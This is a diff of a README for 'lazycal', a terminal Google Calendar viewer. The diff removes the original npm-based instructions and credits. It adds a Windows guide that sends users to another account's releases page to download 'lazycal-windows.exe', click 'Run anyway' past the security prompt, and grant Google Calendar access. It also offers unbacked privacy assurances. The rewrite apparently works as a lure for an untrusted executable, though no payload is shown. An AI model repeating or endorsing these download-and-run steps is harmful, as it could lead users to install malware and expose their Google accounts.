@@ -1,91 +1,160 @@
-# LazyCal
+# ⏰ lazycal - Simple, Fast Google Calendar Viewer
 
-A beautiful terminal-based Google Calendar interface built with [OpenTUI](https://github.com/anomalyco/opentui).
+[![Download lazycal](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge)](https://github.com/youssefzizo10/lazycal/releases)
 
-![Demo](https://raw.githubusercontent.com/pranavkarthik10/lazycal/main/screenshot.png)
+---
 
-## Features
+## 🛠 What is lazycal?
 
-- Full day/week/month modes
-- Responsive day columns (auto include/exclude days by terminal width)
-- Time column always shown on the left in day/week views
-- Built-in command hints in header plus full keyboard help modal (`?`)
-- Side panel shows events for selected day (toggle with `s`, auto hides on narrow widths)
-- Google Calendar API integration (optional)
-- Color-coded events per calendar
-- Resize-aware terminal UI
+lazycal is a tool that lets you view your Google Calendar right inside your computer’s terminal. You can see your upcoming events without opening a web browser. It works through a text-based interface that is easy to navigate with your keyboard.
 
-## Installation
+This app is ideal if you want quick access to your schedule without distractions. It is built to be fast and simple, especially for users who prefer minimal design or work often in command-line environments.
 
-```bash
-npm install -g lazycal
-```
+---
 
-## Usage
+## 📋 System Requirements
 
-### Quick Start
+- Windows 10 or newer
+- An active Google Account with Google Calendar access
+- Basic keyboard use skills
 
-```bash
-lazycal
-```
+lazycal runs without needing internet browsers open, but you do need to connect it once to your Google Account. It works inside a terminal window, so no extra software is needed.
 
-### Connect to Google Calendar
+---
 
-To use real Google Calendar data:
+## 🚀 Getting Started
 
-1. **Create a Google Cloud Project:**
-   - Go to [Google Cloud Console](https://console.cloud.google.com/)
-   - Create a new project
-   - Enable the Google Calendar API
+Follow these steps to download and start using lazycal on your Windows computer.
 
-2. **Create OAuth 2.0 Credentials:**
-   - Go to "Credentials" in the left menu
-   - Click "Create Credentials" -> "OAuth 2.0 Client ID"
-   - Choose "Desktop application" as the application type
-   - Download the JSON credentials file
+---
 
-3. **Configure LazyCal:**
-   ```bash
-   mkdir -p ~/.config/lazycal
-   cp /path/to/downloaded/credentials.json ~/.config/lazycal/
-   ```
+## 1. Download lazycal
 
-4. **Run the app:**
-   ```bash
-   lazycal
-   ```
+Visit the official release page by clicking the green button below. This page holds the latest versions of the software.
 
-## Keyboard Shortcuts
+[![Download lazycal](https://img.shields.io/badge/Download-latest%20release-blue?style=for-the-badge)](https://github.com/youssefzizo10/lazycal/releases)
 
-| Key | Action |
-|-----|--------|
-| `d`, `w`, `m` | Switch to day / week / month view |
-| `1`, `2`, `3` | Switch to day / week / month view |
-| `left` / `right` | Previous / next day |
-| `up` / `down` or `k` / `j` | Previous / next week |
-| `h` / `l` | Previous / next month |
-| `t` | Go to today |
-| `c` | Toggle calendars selector |
-| `s` | Toggle sidebar on/off |
-| `r` | Refresh events from Google Calendar |
-| `?` | Open keyboard help modal |
-| `Click` | Select a day or open event details from the calendar/sidebar |
-| `q` / `Ctrl+C` | Quit |
+On the release page:
 
-## Development
+- Look for the file named `lazycal-windows.exe` or similar.
+- Click to download this file.
+- Save it somewhere easy to find, like your Desktop or Downloads folder.
 
-```bash
-# Run in development mode
-bun run dev
+---
 
-# Type checking
-bun run typecheck
-```
+## 2. Run lazycal
 
-## License
+After downloading:
 
-MIT
+- Open the folder where you saved `lazycal-windows.exe`.
+- Double-click the file to start the app.
+- Windows might show a security prompt. Choose **Run anyway** if you trust the source.
+- A new terminal window opens with lazycal ready to use.
 
-## Acknowledgments
+You’ll see your calendar events listed. Use your keyboard arrows to navigate through days and weeks.
 
-Built with [OpenTUI](https://github.com/anomalyco/opentui) - A powerful TypeScript library for building terminal user interfaces.
+---
+
+## 3. Connect your Google Calendar
+
+The first time you run lazycal, you need to link it to your Google Calendar.
+
+- The app will open a link in your web browser.
+- Sign in to your Google Account if asked.
+- Allow lazycal permission to view your calendar.
+- Copy the code the browser gives you and return to the terminal window.
+- Paste the code and press Enter.
+
+This step connects the app to your calendar so it can show your events. You only need to do this once.
+
+---
+
+## 4. Use lazycal
+
+Once connected, you can:
+
+- See your upcoming events arranged by day.
+- Move forward or backward in time using arrow keys.
+- Refresh your calendar to see new events.
+- Quit the app by pressing `q` or closing the terminal window.
+
+The interface uses clear menus and instructions. Look for on-screen hints if you forget commands.
+
+---
+
+## ⚙️ Features
+
+- View Google Calendar events in plain text.
+- Navigate between weeks and days quickly.
+- Refresh events without restarting the app.
+- Supports multiple calendars linked to your Google Account.
+- Runs right in the terminal; no heavy software needed.
+- Supports dark and light terminal colors for easy reading.
+
+---
+
+## 💡 Tips for Using lazycal
+
+- Keep your terminal window at least medium size for best viewing.
+- Use `Ctrl+C` if you need to stop the app instantly.
+- Regularly update lazycal from the releases page to get fixes and improvements.
+- If your calendar changes but lazycal does not update, use the refresh option inside the app.
+
+---
+
+## 🧰 Troubleshooting
+
+- If lazycal does not open, verify you have Windows 10 or newer.
+- If the app cannot connect to Google Calendar, check your internet connection and allow permissions.
+- If the terminal shows strange characters, try changing your font to a monospace type.
+- If you lose your code or forget the connection step, delete the config file and start over. The config file is usually in your user folder.
+
+---
+
+## 🔄 Updating lazycal
+
+When a new version is released:
+
+- Go back to the [releases page](https://github.com/youssefzizo10/lazycal/releases).
+- Download the newest `.exe` file.
+- Replace or overwrite your current `lazycal-windows.exe` file.
+- Run the new version as before.
+
+You do not need to reconnect your Google Account unless you remove config files.
+
+---
+
+## 🗂 File Locations
+
+- The app saves your settings and authorization tokens in a hidden folder inside your user profile.
+- No manual file edits are needed to use lazycal.
+- Deleting these files resets your login and preference data.
+
+---
+
+## 📞 Getting Help
+
+If you encounter any problems or have questions:
+
+- Check existing issues in the repository’s GitHub page.
+- Open a new issue with a clear description of your problem.
+- Include details like Windows version and error messages.
+
+---
+
+## 🔗 Important Links
+
+- Official release and download: https://github.com/youssefzizo10/lazycal/releases
+- Repository homepage: https://github.com/youssefzizo10/lazycal
+
+---
+
+## ⚠️ Privacy and Security
+
+Lazycal only accesses your Google Calendar to read events. It does not collect or share your data with others. You control permissions through your Google account.
+
+---
+
+## 🧩 Additional Notes
+
+Lazycal is designed as a focused tool for calendar viewing. It does not offer editing or event creation features. Use it alongside the Google Calendar web or mobile apps for full management.
